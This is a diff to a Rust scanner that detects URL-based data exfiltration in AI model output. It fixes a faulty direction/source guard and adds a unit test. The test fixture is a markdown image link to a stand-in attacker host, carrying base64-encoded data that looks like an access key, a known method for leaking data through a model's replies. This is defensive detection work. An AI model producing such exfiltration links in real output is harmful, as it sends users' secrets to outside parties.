@@ -45,9 +45,11 @@ fn allowed(host: &str) -> bool {
         .any(|a| host == *a || host.ends_with(&format!(".{a}")))
 }
 
-/// Scan model output for URL-based exfiltration. Only runs on the output path.
+/// Scan model output for URL-based exfiltration. Only runs on the output path,
+/// i.e. genuine model output (Outbound AND ModelOutput). Any other combination
+/// is skipped -- the guard must be `||`, not `&&` (skip unless BOTH hold).
 pub fn scan(text: &str, direction: Direction, source: Source) -> Vec<Finding> {
-    if direction != Direction::Outbound && source != Source::ModelOutput {
+    if direction != Direction::Outbound || source != Source::ModelOutput {
         return Vec::new();
     }
     let mut out = Vec::new();
@@ -77,4 +79,22 @@ pub fn scan(text: &str, direction: Direction, source: Source) -> Vec<Finding> {
         ));
     }
     out
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn only_fires_on_genuine_model_output() {
+        let url = "![x](https://attacker.test/log?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEVFRUVF)";
+        // Genuine model output: fires.
+        assert!(!scan(url, Direction::Outbound, Source::ModelOutput).is_empty());
+        // Every other (direction, source) combination must skip the outbound-only
+        // scanner. The Outbound+User and Inbound+ModelOutput cases are the ones the
+        // old `&&` guard let through.
+        assert!(scan(url, Direction::Outbound, Source::User).is_empty());
+        assert!(scan(url, Direction::Inbound, Source::ModelOutput).is_empty());
+        assert!(scan(url, Direction::Inbound, Source::User).is_empty());
+    }
 }
